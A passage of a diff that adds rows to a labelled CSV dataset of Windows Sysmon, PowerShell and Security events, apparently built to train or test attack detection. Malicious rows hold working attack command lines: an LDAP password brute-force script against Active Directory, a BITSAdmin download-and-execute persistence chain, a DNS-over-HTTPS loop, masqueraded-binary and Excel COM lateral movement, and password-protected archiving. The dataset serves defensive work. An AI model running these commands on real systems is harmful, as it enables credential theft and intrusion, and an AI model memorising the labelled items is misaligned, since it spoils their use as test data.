+	CommandLine=",PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',The PowerShell content copies calc.exe to a masqueraded path and instantiates an Excel COM object on localhost. Evidence: powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
+CYB499-055,Malicious,Sysmon,Persistence,persistence_persist_download_execute,data/raw/malicious/persistence_persist_download_execute_json/T1197-3_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,5,2024-10-25 17:02:54.5274122,Server002,SERVER002\admin_test,C:\Windows\System32\bitsadmin.exe,,,,,,,,Sysmon event 5 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\bitsadmin.exe; user=SERVER002\admin_test,The command chain uses BITSAdmin to download content and set a notify command for follow-on execution. Evidence: C:\Windows\System32\bitsadmin.exe
+CYB499-056,Malicious,PowerShell,Command and Control,c2c_dns_https_largequeryvolume,data/raw/malicious/c2c_dns_https_largequeryvolume_json/T1572-1_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-28 15:11:15.6852996,Server002,,,"powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}",,,,,,"Registry, Started, 	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.5007
+	HostId=bad9f401-26a8-4dfa-a31a-2fbb02ead48d
+	HostApplication=powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBa...","The event shows a PowerShell-driven DNS-over-HTTPS style query loop to 8.8.8.8 with randomized xip.io hostnames. Evidence: powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}"
+CYB499-057,Benign,PowerShell,,powershell,data/raw/benign/powershell.json,PowerShell,Windows PowerShell,400,2024-10-03T19:20:51.9084709+00:00,Server002,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command ls ~/Desktop,,,,,,"Available, None, 	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.2673
+	HostId=96a16f6a-82d6-47c3-94cf-3c43c596ea27
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command ls ~/Desktop
+	EngineVersion=5.1.19041.2673
+	RunspaceId=01a6c362-9230-4884-9c55-04ffffd4098b
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",PowerShell event 400 from PowerShell on Server002; cmd=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command ls ~/Desktop; detail=Engine state is changed from None to Available,Selected from the benign baseline PowerShell log; the host application shows routine shell startup or administrative commands without attack-specific indicators.
+CYB499-058,Malicious,Sysmon,Persistence,persistence_persist_download_execute,data/raw/malicious/persistence_persist_download_execute_json/T1197-3_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,5,2024-10-25 17:02:54.6029949,Server002,SERVER002\admin_test,C:\Windows\System32\bitsadmin.exe,,,,,,,,Sysmon event 5 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\bitsadmin.exe; user=SERVER002\admin_test,The command chain uses BITSAdmin to download content and set a notify command for follow-on execution. Evidence: C:\Windows\System32\bitsadmin.exe
+CYB499-059,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-04-16T20:17:32.8574805+00:00,Server002,SERVER002\lplui,C:\Program Files (x86)\Microsoft Office\root\vfs\ProgramFilesCommonX64\Microsoft Shared\Office16\AI\ai.exe,"""C:\Program Files (x86)\Microsoft Office\root\vfs\ProgramFilesCommonX64\Microsoft Shared\Office16\AI\ai.exe"" ""A3EF33AD-93E0-450F-AD3C-FC714CC60F2C"" ""5717FC2C-3512-4465-8531-E55439A39637"" ""6712"" ""C:\Program Files (x86)\Microsoft Office\root\Office16\POWERPNT.EXE"" ""PowerPointCombinedFloatieLreOnline.onnx""",C:\Program Files (x86)\Microsoft Office\root\Office16\POWERPNT.EXE,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Program Files (x86)\Microsoft Office\root\vfs\ProgramFilesCommonX64\Microsoft Shared\Office16\AI\ai.exe; cmd=""C:\Program Files (x86)\Microsoft Office\root\vfs\ProgramFilesCommonX64\Microsoft Shared\Office16\AI\ai.exe"" ""A3EF33AD-93E0-450F-AD3C-FC714CC60F2C"" ""5717FC2C-3512-4465-8531-E554...; parent=C:\Program Files (x86)\Microsoft Office\root\Office16\POWERPNT.EXE; parent_cmd=""C:\Program Files (x86)\Microsoft Office\root\Office16\POWERPNT.EXE""; user=SERVER002\lplui; detail=Process creation",Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
+CYB499-060,Malicious,Sysmon,Collection,collection_compressData_lockwithpw_exfiltrationwinrar,data/raw/malicious/collection_compressData_lockwithpw_exfiltrationwinrar_json/T1560.001-2_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-28 07:49:39.5695651,Server002,SERVER002\admin_test,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c mkdir .\tmp\victim-files & cd .\tmp\victim-files & echo ""This file will be encrypted"" > .\encrypted_file.txt & ""%%programfiles%%/WinRAR/Rar.exe"" a -hp""blue"" hello.rar & dir",C:\Windows\System32\wsmprovhost.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\cmd.exe; cmd=""cmd.exe"" /c mkdir .\tmp\victim-files & cd .\tmp\victim-files & echo ""This file will be encrypted"" > .\encrypted_file.txt & ""%%programfiles%%/WinRAR/Rar.exe"" a -hp""blue"" hello.r...; parent=C:\Windows\System32\wsmprovhost.exe; parent_cmd=C:\Windows\system32\wsmprovhost.exe -Embedding; user=SERVER002\admin_test","The command line stages files and invokes WinRAR to create a password-protected archive. Evidence: ""cmd.exe"" /c mkdir .\tmp\victim-files & cd .\tmp\victim-files & echo ""This file will be encrypted"" > .\encrypted_file.txt & ""%%programfiles%%/WinRAR/Rar.exe"" a -hp""blue"" hello.rar & dir"
+CYB499-061,Malicious,Sysmon,Command and Control,c2c_dns_https_largequeryvolume,data/raw/malicious/c2c_dns_https_largequeryvolume_json/T1572-1_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-28 15:11:09.7873192,Server002,SERVER002\admin_test,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""powershell.exe"" & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest \""""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT\"""" -UseBasicParsing).Content }}",C:\Windows\System32\wsmprovhost.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; cmd=""powershell.exe"" & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest \""""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT\"""" ...; parent=C:\Windows\System32\wsmprovhost.exe; parent_cmd=C:\Windows\system32\wsmprovhost.exe -Embedding; user=SERVER002\admin_test","The event shows a PowerShell-driven DNS-over-HTTPS style query loop to 8.8.8.8 with randomized xip.io hostnames. Evidence: ""powershell.exe"" & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest \""""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT\"""" -UseBasicParsing).Content }}"
+CYB499-062,Benign,Security,,security,data/raw/benign/security.json,Microsoft-Windows-Security-Auditing,Security,4624,2025-04-29T17:33:24.2116907+00:00,Server002,WORKGROUP\SERVER002$,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,,,,,,,Security event 4624 from Microsoft-Windows-Security-Auditing on Server002; image=C:\Windows\System32\services.exe; cmd=C:\Windows\System32\services.exe; user=WORKGROUP\SERVER002$; detail=Successful logon,Selected from the benign baseline Security log; this is routine Windows audit activity rather than an attack-specific event.
+CYB499-063,Benign,Security,,security,data/raw/benign/security.json,Microsoft-Windows-Security-Auditing,Security,5061,2025-04-23T19:01:44.7319739+00:00,Server002,LOCAL SERVICE,,,,,,,,,Security event 5061 from Microsoft-Windows-Security-Auditing on Server002; user=LOCAL SERVICE,Selected from the benign baseline Security log; this is routine Windows audit activity rather than an attack-specific event.
+CYB499-064,Malicious,PowerShell,Credential Access,credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP,data/raw/malicious/credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP_json/T1110.001-2_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-24 13:19:18.5215770,Server002,,,"powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {",,,,,,"FileSystem, Started, 	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.5007
+	HostId=4a335bbc-027a-41e8-a2ef-bc57ff7bb925
+	HostApplication=powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {
+ Write-Host ""Only 'NTLM' and 'Kerberos' auth methods are supported""
+ exit 1
+}
+
+[System.Reflection.Assembly]::LoadWithPartialName(""System.DirectoryServices.Protocols"") | Out-Null
+$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(""$env:UserDnsDomain"",389)
+
+$passwordList = Get-Content -Path ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\src\passwords.txt""
+foreach ($password in $passwordList){
+ $credz = new-object System.Net.NetworkCredential(""$ENV:USERNAME"", $password, ""$env:UserDnsDomain"")
+ $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)
+ try {
+ Write-Host "" [-] Attempting ${password} on account $ENV:USERNAME.""
+ $conn.bind()
+ # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
+ Write-Host "" [!] $ENV:USERNAME:${password} are valid credentials!""
+ } catch {
+ Write-Host $_.Exception.Message
+ }
+}
+Write-Host ""End of bruteforce""}
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {","The PowerShell/LDAP content iterates passwords against Active Directory using System.DirectoryServices.Protocols. Evidence: powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {"
+CYB499-065,Malicious,Sysmon,Collection,collection_compressData_lockwithpw_exfiltrationwinrar,data/raw/malicious/collection_compressData_lockwithpw_exfiltrationwinrar_json/T1560.001-2_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-28 07:49:38.5464235,Server002,SERVER002\admin_test,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c if not exist ""%%programfiles%%/WinRAR/Rar.exe"" (exit /b 1)",C:\Windows\System32\wsmprovhost.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\cmd.exe; cmd=""cmd.exe"" /c if not exist ""%%programfiles%%/WinRAR/Rar.exe"" (exit /b 1); parent=C:\Windows\System32\wsmprovhost.exe; parent_cmd=C:\Windows\system32\wsmprovhost.exe -Embedding; user=SERVER002\admin_test","The command line stages files and invokes WinRAR to create a password-protected archive. Evidence: ""cmd.exe"" /c if not exist ""%%programfiles%%/WinRAR/Rar.exe"" (exit /b 1)"
+CYB499-066,Benign,PowerShell,,powershell,data/raw/benign/powershell.json,PowerShell,Windows PowerShell,400,2024-10-03T20:25:35.9506228+00:00,Server002,,,C:\Windows\system32\wsmprovhost.exe -Embedding,,,,,,"Available, None, 	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=7c203603-13c6-456e-acf9-42ef47d79cc6
+	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.19041.2673
+	RunspaceId=4a699811-97ed-4b76-aabf-1c6918966788
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",PowerShell event 400 from PowerShell on Server002; cmd=C:\Windows\system32\wsmprovhost.exe -Embedding; detail=Engine state is changed from None to Available,Selected from the benign baseline PowerShell log; the host application shows routine shell startup or administrative commands without attack-specific indicators.
+CYB499-067,Malicious,Sysmon,Credential Access,credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP,data/raw/malicious/credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP_json/T1110.001-2_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-24 13:19:17.8185552,Server002,SERVER002\admin_test,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""powershell.exe"" & {if (\""""NTLM\"""".ToLower() -NotIn @(\""""ntlm\"""",\""""kerberos\"""")) {,   Write-Host \""""Only 'NTLM' and 'Kerberos' auth methods are supported\"""",   exit 1, }, [System.Reflection.Assembly]::LoadWithPartialName(\""""System.DirectoryServices.Protocols\"""") | Out-Null, $di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\""""$env:UserDnsDomain\"""",389), $passwordList = Get-Content -Path \""""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\src\passwords.txt\"""", foreach ($password in $passwordList){,   $credz = new-object System.Net.NetworkCredential(\""""$ENV:USERNAME\"""", $password, \""""$env:UserDnsDomain\""""),   $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM),   try {,     Write-Host \"""" [-] Attempting ${password} on account $ENV:USERNAME.\"""",     $conn.bind(),     # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success,     Write-Host \"""" [!] $ENV:USERNAME:${password} are valid credentials!\"""",   } catch {,     Write-Host $_.Exception.Message,   }, }, Write-Host \""""End of bruteforce\""""}",C:\Windows\System32\wsmprovhost.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; cmd=""powershell.exe"" & {if (\""""NTLM\"""".ToLower() -NotIn @(\""""ntlm\"""",\""""kerberos\"""")) {, Write-Host \""""Only 'NTLM' and 'Kerberos' auth methods are supported\"""", exit 1, }, [System.R...; parent=C:\Windows\System32\wsmprovhost.exe; parent_cmd=C:\Windows\system32\wsmprovhost.exe -Embedding; user=SERVER002\admin_test","The PowerShell/LDAP content iterates passwords against Active Directory using System.DirectoryServices.Protocols. Evidence: ""powershell.exe"" & {if (\""""NTLM\"""".ToLower() -NotIn @(\""""ntlm\"""",\""""kerberos\"""")) {, Write-Host \""""Only 'NTLM' and 'Kerberos' auth methods are supported\"""", exit 1, }, [System.Reflection.Assembly]::LoadWithPartialName..."
+CYB499-068,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-04-18T09:38:51.6834772+00:00,Server002,SERVER002\lplui,C:\Windows\System32\BackgroundTransferHost.exe,"""BackgroundTransferHost.exe"" -ServerName:BackgroundTransferHost.1",,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\BackgroundTransferHost.exe; cmd=""BackgroundTransferHost.exe"" -ServerName:BackgroundTransferHost.1; parent_cmd=-; user=SERVER002\lplui; detail=Process creation",Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
+CYB499-069,Malicious,PowerShell,Lateral Movement,lateral_powershell_lateral_usingExcelAppObject,data/raw/malicious/lateral_powershell_lateral_usingExcelAppObject_Json/T1021.003-2_Windows PowerShell.json,PowerShell,Windows PowerShell,400,2024-10-21 11:25:01.3198313,Server002,,,powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',,,,,,"Available, None, 	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.5007
+	HostId=bb6cac0a-46f5-4aad-9c14-28049a346862
+	HostApplication=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
+$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""Excel.Application"",""localhost""))
+$com.ActivateMicrosoftApp(""5"")}
+	EngineVersion=5.1.19041.5007
+	RunspaceId=bbf1a6fb-f587-4c21-9b3b-0c34e2768fa2
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",PowerShell event 400 from PowerShell on Server002; cmd=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',The PowerShell content copies calc.exe to a masqueraded path and instantiates an Excel COM object on localhost. Evidence: powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
+CYB499-070,Benign,Security,,security,data/raw/benign/security.json,Microsoft-Windows-Security-Auditing,Security,4798,2025-04-29T17:28:15.8564877+00:00,Server002,WORKGROUP\SERVER002$ (S-1-5-18),,,,,,,,,Security event 4798 from Microsoft-Windows-Security-Auditing on Server002; user=WORKGROUP\SERVER002$ (S-1-5-18); detail=A user's local group membership was enumerated,Selected from the benign baseline Security log; this is routine Windows audit activity rather than an attack-specific event.
+CYB499-071,Benign,PowerShell,,powershell,data/raw/benign/powershell.json,PowerShell,Windows PowerShell,400,2024-10-13T17:14:21.0779885+00:00,Server002,,,"powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\inf\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; if ($Data -match '\[defaultinstall.nt(amd64|arm|arm64|x86)\]') { $Res = 1; break; } } Write-Host 'Final result:', $Res;",,,,,,"Available, None, 	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.4894
+	HostId=39be62ba-d580-4a17-a538-654dae9dd03c
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\inf\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; if ($Data -match '\[defaultinstall.nt(amd64|arm|arm64|x86)\]') { $Res = 1; break; } } Write-Host 'Final result:', $Res;
+	EngineVersion=5.1.19041.4894
+	RunspaceId=09e2ed45-7c24-46bc-84e5-54bdb75d6960
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",PowerShell event 400 from PowerShell on Server002; cmd=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\inf\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; i...; detail=Engine state is changed from None to Available,Selected from the benign baseline PowerShell log; the host application shows routine shell startup or administrative commands without attack-specific indicators.
+CYB499-072,Malicious,PowerShell,Credential Access,credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP,data/raw/malicious/credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP_json/T1110.001-2_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-24 13:19:18.5122741,Server002,,,"powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {",,,,,,"Alias, Started, 	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.5007
+	HostId=4a335bbc-027a-41e8-a2ef-bc57ff7bb925
+	HostApplication=powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {
+ Write-Host ""Only 'NTLM' and 'Kerberos' auth methods are supported""
+ exit 1
+}
+
+[System.Reflection.Assembly]::LoadWithPartialName(""System.DirectoryServices.Protocols"") | Out-Null
+$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(""$env:UserDnsDomain"",389)
+
+$passwordList = Get-Content -Path ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\src\passwords.txt""
+foreach ($password in $passwordList){
+ $credz = new-object System.Net.NetworkCredential(""$ENV:USERNAME"", $password, ""$env:UserDnsDomain"")
+ $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)
+ try {
+ Write-Host "" [-] Attempting ${password} on account $ENV:USERNAME.""
+ $conn.bind()
+ # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
+ Write-Host "" [!] $ENV:USERNAME:${password} are valid credentials!""
+ } catch {
+ Write-Host $_.Exception.Message
+ }
+}
+Write-Host ""End of bruteforce""}
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {","The PowerShell/LDAP content iterates passwords against Active Directory using System.DirectoryServices.Protocols. Evidence: powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {"
+CYB499-073,Malicious,PowerShell,Lateral Movement,lateral_powershell_lateral_usingExcelAppObject,data/raw/malicious/lateral_powershell_lateral_usingExcelAppObject_Json/T1021.003-2_Windows PowerShell.json,PowerShell,Windows PowerShell,300,2024-10-21 11:25:02.6400626,Server002,,,powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',,,,,,"Attempting to perform the CopyItem operation on the 'FileSystem' provider failed for path 'C:\windows\system32\calc.exe'. Could not find a part of the path 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'., 	ProviderName=FileSystem
+	ExceptionClass=ProviderInvocationException
+	ErrorCategory=InvalidOperation
+	ErrorId=CopyItemProviderException
+	ErrorMessage=Attempting to perform the CopyItem operation on the 'FileSystem' provider failed for path 'C:\windows\system32\calc.exe'. Could not find a part of the path 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'.
+
+	Severity=Warning
+
+	SequenceNumber=15
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.5007
+	HostId=bb6cac0a-46f5-4aad-9c14-28049a346862
+	HostApplication=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
+$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""Excel.Application"",""localhost""))
+$com.ActivateMicrosoftApp(""5"")}
+	EngineVersion=5.1.19041.5007
+	RunspaceId=bbf1a6fb-f587-4c21-9b3b-0c34e2768fa2
+	PipelineId=1
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",PowerShell event 300 from PowerShell on Server002; cmd=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',The PowerShell content copies calc.exe to a masqueraded path and instantiates an Excel COM object on localhost. Evidence: powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
+CYB499-074,Malicious,Sysmon,Persistence,persistence_persist_download_execute,data/raw/malicious/persistence_persist_download_execute_json/T1197-3_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-25 17:02:54.4919875,Server002,SERVER002\admin_test,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe  /create fileBITS,C:\Windows\System32\cmd.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\bitsadmin.exe; cmd=bitsadmin.exe /create fileBITS; parent=C:\Windows\System32\cmd.exe; parent_cmd=""cmd.exe"" /c bitsadmin.exe /create fileBITS & bitsadmin.exe /addfile fileBITS https://raw.githubusercontent.com/file/file-file/master/files/data/data.md %temp%\bitsadmin3_flag.p...; user=SERVER002\admin_test",The command chain uses BITSAdmin to download content and set a notify command for follow-on execution. Evidence: bitsadmin.exe /create fileBITS
+CYB499-075,Benign,Security,,security,data/raw/benign/security.json,Microsoft-Windows-Security-Auditing,Security,4738,2025-04-30T08:09:41.4802831+00:00,Server002,WORKGROUP\SERVER002$,,,,,,,,,Security event 4738 from Microsoft-Windows-Security-Auditing on Server002; user=WORKGROUP\SERVER002$; detail=A user account was changed,Selected from the benign baseline Security log; this is routine Windows audit activity rather than an attack-specific event.
+CYB499-076,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-04-17T16:36:08.4915718+00:00,Server002,SERVER002\lplui,C:\Windows\System32\AppHostRegistrationVerifier.exe,"""C:\Windows\system32\AppHostRegistrationVerifier.exe""",C:\Windows\System32\svchost.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\AppHostRegistrationVerifier.exe; cmd=""C:\Windows\system32\AppHostRegistrationVerifier.exe""; parent=C:\Windows\System32\svchost.exe; parent_cmd=C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule; user=SERVER002\lplui; detail=Process creation",Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
+CYB499-077,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-04-23T19:49:28.8060298+00:00,Server002,NT AUTHORITY\SYSTEM,C:\Program Files (x86)\BraveSoftware\Update\Install\{D5A35684-367A-48CD-B6FB-1B83E0360456}\brave_installer-delta-x64.exe,"""C:\Program Files (x86)\BraveSoftware\Update\Install\{D5A35684-367A-48CD-B6FB-1B83E0360456}\brave_installer-delta-x64.exe""",C:\Program Files (x86)\BraveSoftware\Update\BraveUpdate.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Program Files (x86)\BraveSoftware\Update\Install\{D5A35684-367A-48CD-B6FB-1B83E0360456}\brave_installer-delta-x64.exe; cmd=""C:\Program Files (x86)\BraveSoftware\Update\Install\{D5A35684-367A-48CD-B6FB-1B83E0360456}\brave_installer-delta-x64.exe""; parent=C:\Program Files (x86)\BraveSoftware\Update\BraveUpdate.exe; parent_cmd=""C:\Program Files (x86)\BraveSoftware\Update\BraveUpdate.exe"" /svc; user=NT AUTHORITY\SYSTEM; detail=Process creation",Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
+CYB499-078,Malicious,PowerShell,Lateral Movement,lateral_powershell_lateral_usingExcelAppObject,data/raw/malicious/lateral_powershell_lateral_usingExcelAppObject_Json/T1021.003-2_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-21 11:25:01.0004325,Server002,,,powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',,,,,,"Variable, Started, 	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.5007
+	HostId=bb6cac0a-46f5-4aad-9c14-28049a346862
+	HostApplication=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
+$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""Excel.Application"",""localhost""))
+$com.ActivateMicrosoftApp(""5"")}
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
